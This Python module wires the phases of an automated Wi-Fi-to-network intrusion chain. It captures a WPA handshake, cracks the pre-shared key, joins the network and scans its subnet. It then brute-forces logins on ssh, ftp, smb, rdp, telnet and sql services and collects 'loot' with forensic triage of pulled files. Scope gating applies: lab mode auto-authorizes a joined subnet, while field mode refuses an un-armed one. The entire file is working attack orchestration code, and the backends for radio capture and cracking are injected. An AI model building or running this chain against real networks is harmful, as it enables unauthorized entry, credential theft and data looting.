"""Real executor wiring for the kill-chain Operator — the glue that makes the
chain actually *do* something instead of running fake steps.

The Operator (operator.py) is a deterministic, gated conductor driven by injected
`executor(target) -> (ok, result)` callables. This module builds the REAL set,
tying each phase to the tool/provider that performs it and threading a **per-target
context** so data flows down the chain:

    CAPTURE  → a handshake file           (ctx['handshake'])
    CRACK    → a recovered PSK + SSID      (ctx['psk'], ctx['ssid'])
    JOIN     → associate + DHCP → subnet   (ctx['subnet'])        [the new link]
    SCAN     → hosts on that subnet        (ctx['hosts'])
    CRED     → recovered credentials       (ctx['creds'])
    LOOT     → a LootBook (+ forensic triage of pulled files)

Capture and crack need a radio/compute, so their backends are injected (the live
daemon supplies the real ones; tests and the simulator supply fakes). JOIN uses
WifiJoiner; SCAN/CRED reuse netrecon's scope-gated recon_subnet / try_credentials —
so in LAB the freshly joined private subnet auto-authorizes (unleashed), while FIELD
still refuses an un-armed subnet. The Operator is untouched: the per-target context
lives in these closures, keyed by target, so multiple targets never bleed together.

Pure/testable: every backend is injected; with fakes this runs the whole chain end
to end, no radio and no network.
"""
from __future__ import annotations

from typing import Callable, Dict, List, Optional, Sequence, Tuple

from .operator import Phase
from ..netrecon.join import WifiJoiner
from ..netrecon.pipeline import recon_subnet, try_credentials, LootBook, ReconRefused


def build_chain_executors(
    *,
    scope,
    capture: Optional[Callable[[str], Tuple[bool, str, Optional[str]]]] = None,
    crack: Optional[Callable[[Optional[str], str], Tuple[bool, str, Optional[str], Optional[str]]]] = None,
    joiner: Optional[WifiJoiner] = None,
    scanner=None,
    tester=None,
    usernames: Sequence[str] = (),
    passwords: Sequence[str] = (),
    services: Sequence[str] = ("ssh", "ftp", "smb", "rdp", "telnet", "sql"),
    triage: Optional[Callable[[Sequence[str]], dict]] = None,
    contexts: Optional[Dict[str, dict]] = None,
) -> Tuple[Dict[Phase, Callable[[str], Tuple[bool, str]]], Dict[str, dict]]:
    """Return (executors, contexts). `contexts[target]` accumulates the chain's
    carried state and the per-phase artifacts, so a caller (and the status model)
    can read what each target yielded."""
    contexts = {} if contexts is None else contexts

    def ctx(t: str) -> dict:
        return contexts.setdefault(t, {})

    def _capture(t: str) -> Tuple[bool, str]:
        if capture is None:
            return False, "no capture backend wired (runs under the live daemon)"
        ok, reason, handshake = capture(t)
        ctx(t)["handshake"] = handshake
        return ok, reason

    def _crack(t: str) -> Tuple[bool, str]:
        if crack is None:
            return False, "no crack backend wired (runs under the live daemon)"
        ok, reason, psk, ssid = crack(ctx(t).get("handshake"), t)
        if psk:
            ctx(t)["psk"] = psk
            ctx(t)["ssid"] = ssid or t
        return ok, reason

    def _join(t: str) -> Tuple[bool, str]:
        c = ctx(t)
        if not c.get("psk"):
            return False, "no recovered key — nothing to join with"
        jr = (joiner or WifiJoiner()).join(c.get("ssid") or t, c["psk"])
        c["subnet"] = jr.subnet
        c["join"] = jr.to_dict()
        return jr.joined, jr.reason

    def _scan(t: str) -> Tuple[bool, str]:
        subnet = ctx(t).get("subnet")
        if not subnet:
            return False, "no subnet from JOIN — nothing to pivot into"
        try:
            res = recon_subnet(subnet, scope=scope, scanner=scanner)
        except ReconRefused as refused:
            return False, str(refused)        # FIELD: subnet not armed → refused (honest)
        if not res.available:
            return False, res.reason
        ctx(t)["hosts"] = list(res.hosts)
        return True, f"{res.reason} on {subnet}"

    def _cred(t: str) -> Tuple[bool, str]:
        hosts = ctx(t).get("hosts") or []
        if not hosts:
            return False, "no hosts discovered to test"
        if not (usernames and passwords):
            return True, f"{len(hosts)} host(s) mapped; no wordlists set — skipping cred-test"
        found: List = []
        tested = 0
        for h in hosts:
            for p in getattr(h, "ports", []):
                svc = (getattr(p, "service", "") or getattr(p, "proto", "")).lower()
                if services and svc and svc not in services:
                    continue
                tested += 1
                try:
                    cred = try_credentials(h.ip, p.number, svc or "ssh", usernames, passwords,
                                           scope=scope, tester=tester)
                except ReconRefused:
                    continue
                if cred.found:
                    found.append(cred.found)
        ctx(t)["creds"] = found
        return True, f"tested {tested} service(s), recovered {len(found)} credential(s)"

    def _loot(t: str) -> Tuple[bool, str]:
        c = ctx(t)
        book = LootBook()
        book.add_hosts(c.get("hosts") or [])
        for cred in c.get("creds") or []:
            book.credentials.append(cred)
        files = c.get("files") or []
        triaged = {}
        if files:
            tri = triage
            if tri is None:
                from ..loot.triage import triage as tri      # forensic triage by default
            triaged = tri(files) or {}
        c["loot"] = {"hosts": len(c.get("hosts") or []),
                     "credentials": len(c.get("creds") or []),
                     "triage": triaged}
        return True, (f"looted {len(c.get('hosts') or [])} host(s), "
                      f"{len(c.get('creds') or [])} credential(s)"
                      + (f", triaged {len(triaged)} artifact(s)" if triaged else ""))

    executors: Dict[Phase, Callable[[str], Tuple[bool, str]]] = {
        Phase.CAPTURE: _capture,
        Phase.CRACK: _crack,
        Phase.JOIN: _join,
        Phase.PIVOT_SCAN: _scan,
        Phase.PIVOT_CRED: _cred,
        Phase.LOOT: _loot,
    }
    return executors, contexts
